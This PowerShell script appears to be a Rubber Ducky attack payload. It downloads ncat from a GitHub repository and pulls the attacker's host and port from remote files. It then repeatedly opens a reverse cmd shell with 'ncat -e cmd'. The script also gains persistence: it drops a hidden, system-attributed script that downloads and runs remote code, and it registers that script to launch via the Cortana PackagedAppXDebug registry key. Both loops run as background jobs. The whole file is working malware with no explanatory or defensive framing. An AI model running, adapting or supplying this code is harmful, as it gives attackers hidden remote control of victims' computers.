$functions = {
	function script:Reverse
	{
		while($true)
		{
			[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
			New-Item -ItemType Directory -Force -Path "$env:TEMP\ncat"
			((New-Object Net.WebClient).DownloadFile("https://raw.githubusercontent.com/gengstah/rubber-ducky/master/ncat/ncat.exe", "$env:TEMP\ncat\ncat.exe"))
			
			$guid = [Guid]::newGuid()
			$url = ((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/gengstah/rubber-ducky/master/url.txt?id=$guid")).replace("`n","").replace("`r","")
			$port = ((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/gengstah/rubber-ducky/master/port.txt?id=$guid")).replace("`n","").replace("`r","")

			& "$env:TEMP\ncat\ncat.exe" -e cmd $url $port
			
			Start-Sleep -Seconds 60
		}
		
	}
	
	function MaintainPersistence
	{
		while($true)
		{
			$modulename = "18CAD998-388C-4E2A-83B7-C8F009416642.ps1"
			$modulenamepath = "$env:TEMP\$modulename"
			
			if(-Not ([System.IO.File]::Exists($modulenamepath)))
			{
				$guid = [Guid]::newGuid()
				Out-File -InputObject "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12" -Force $env:TEMP\$modulename
				Out-File -InputObject '$scriptPath = ((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/gengstah/rubber-ducky/master/reverse.ps1?id=$guid"))' -Append -NoClobber $env:TEMP\$modulename
				Out-File -InputObject "Invoke-Command -ScriptBlock ([scriptblock]::Create(`$scriptPath))" -Append -NoClobber $env:TEMP\$modulename
				$modulenamefile = Get-Item $env:TEMP\$modulename
				$modulenamefile.Attributes = "Hidden","System"
			}
			
			$cortana = Get-AppxPackage | Select-String "Microsoft.Windows.Cortana"
			New-Item -Path HKCU:Software\Microsoft\Windows\CurrentVersion\PackagedAppXDebug\$cortana -Value "C:\windows\system32\cmd.exe /C powershell -noexit -nologo -WindowStyle Hidden -executionpolicy bypass -command $env:temp\$modulename" -force
			
			Start-Sleep -Seconds 5
		}
	}
}

start-job -InitializationScript $functions -scriptblock {Reverse}
start-job -InitializationScript $functions -scriptblock {MaintainPersistence}
